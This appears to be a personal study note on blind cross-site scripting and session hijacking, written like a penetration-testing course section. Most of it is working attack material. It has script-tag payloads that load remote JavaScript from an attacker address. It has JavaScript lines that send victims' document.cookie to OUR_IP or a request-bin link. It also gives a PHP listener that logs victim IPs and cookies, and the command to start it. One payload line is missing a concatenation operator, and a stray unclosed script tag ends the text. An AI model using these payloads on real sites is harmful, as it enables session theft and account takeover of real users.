
Modern web apps utilize cookies to maintain user's session throughout  different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date.

With the ability to execute JS code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session.

## [[Blind XSS Detection]]
We usually start [[XSS]] attacks by trying to discover if and where an XSS vulnerability exists. A [[Blind XSS]] vulnerability occurs when the vulnerability is triggered in a page we don't have access to.

Blind XSS vulns usually occur with forms only accessible by certain users (admins). For example:
- Contact Forms
- Reviews
- User details
- Support Tickets
- HTTP User-Agent header

*How would we be able to detect an XSS vulnerability if we cannot see how the output is handled?*
To do so, we can use the same trick we used in the previous section, which is to use a JS payload that sends an HTTP request back to our server. If the JS code gets executed, we will get a response on our machine, and we will know that the page is indeed vulnerable.

## Loading a remote script
In HTML, we can write JavaScript code within the `<script>` tags, but we can also include a remote script by providing its URL, as follows:
```html
"><script src="http://OUR_IP/script.js"></script>
"><script src=http://OUR_IP/profilepic></script>
```


## Session hijacking
Once we find a working XSS payload and have identified the vulnerable input field, we can proceed to XSS exploitation and perform a [[Session Hijacking]] attack.

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='document.cookie;
```

PHP server:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

How to start the PHP server:
```bash
sudo php -S OUR_IP:80
```


## requestbin

You can also use https://requestbin.whapi.cloud to get a temp link that you can send and then inspect the HTTP request. For example:
```javascript
<script>document.location='http://THE LINK YOU GENERATED?c='+document.cookie</script>
```
Don't forget the `?c=`.
And then refresh the page and you should be able to see the cookie.

<script>